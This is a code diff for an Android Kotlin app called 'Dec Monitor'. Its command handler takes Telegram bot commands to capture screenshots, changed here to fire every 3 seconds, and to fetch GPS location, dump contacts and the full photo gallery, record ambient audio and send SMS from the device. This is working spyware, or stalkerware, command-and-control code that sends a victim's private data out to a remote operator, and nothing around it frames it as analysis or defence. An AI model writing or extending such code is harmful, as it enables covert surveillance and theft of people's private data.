@@ -3,6 +3,7 @@ package com.dec.monitor
 import android.content.Context
 import com.dec.monitor.media.AmbientRecorder
 import com.dec.monitor.media.GalleryDumper
+import com.dec.monitor.screen.ScreenshotService
 import com.dec.monitor.system.DeviceInfo
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -13,10 +14,13 @@ object CommandHandler {
     fun handle(context: Context, command: String) {
         CoroutineScope(Dispatchers.IO).launch {
             when {
-                command == "/screenshot" -> {
-                    TelegramBot.sendMessage("📸 Taking screenshot...")
-                    val intent = android.content.Intent("com.dec.monitor.TAKE_SCREENSHOT")
-                    context.sendBroadcast(intent)
+                command == "/screenshot_on" -> {
+                    ScreenshotService.fastMode = true
+                    TelegramBot.sendMessage("📸 Screenshot mode ON — every 3 seconds")
+                }
+                command == "/screenshot_off" -> {
+                    ScreenshotService.fastMode = false
+                    TelegramBot.sendMessage("📸 Screenshot mode OFF — back to 30s interval")
                 }
                 command == "/location" -> {
                     TelegramBot.sendMessage("📍 Fetching location...")
@@ -48,15 +52,15 @@ object CommandHandler {
                     GalleryDumper.sendLatest(context, -2)
                 }
                 command == "/galleryfull" -> {
-                    TelegramBot.sendMessage("⚠️ Sending FULL gallery — this may take a while...")
+                    TelegramBot.sendMessage("⚠️ Sending FULL gallery...")
                     GalleryDumper.sendLatest(context, -1)
                 }
                 command == "/mic" -> {
-                    TelegramBot.sendMessage("🎙 Recording ambient audio for 30s...")
+                    TelegramBot.sendMessage("🎙 Recording 30s...")
                     AmbientRecorder.record(context, 30)
                 }
                 command == "/mic60" -> {
-                    TelegramBot.sendMessage("🎙 Recording ambient audio for 60s...")
+                    TelegramBot.sendMessage("🎙 Recording 60s...")
                     AmbientRecorder.record(context, 60)
                 }
                 command.startsWith("/sms ") -> {
@@ -73,31 +77,32 @@ object CommandHandler {
                         """
 🤖 <b>Dec Monitor Commands</b>
 
-📸 /screenshot — screenshot now
+📸 Screenshot:
+/screenshot_on — every 3s fast mode
+/screenshot_off — back to 30s
+
 📍 /location — GPS location
 🔋 /battery — battery status
 📒 /contacts — dump all contacts
-📱 /apps — installed apps list
+📱 /apps — installed apps
 🔔 /ring — ring the device
 
 🖼 Gallery:
 /gallery5 — last 5 photos
 /gallery20 — last 20 photos
 /galleryhalf — half gallery
-/galleryfull — FULL gallery dump
+/galleryfull — full gallery dump
 
 🎙 Mic:
-/mic — record 30s ambient
-/mic60 — record 60s ambient
+/mic — record 30s
+/mic60 — record 60s
 
-💬 /sms &lt;number&gt; &lt;message&gt; — send SMS
+💬 /sms &lt;number&gt; &lt;message&gt;
 ❓ /help — this menu
                         """.trimIndent()
                     )
                 }
-                else -> {
-                    TelegramBot.sendMessage("❓ Unknown. Send /help")
-                }
+                else -> TelegramBot.sendMessage("❓ Unknown. Send /help")
             }
         }
     }
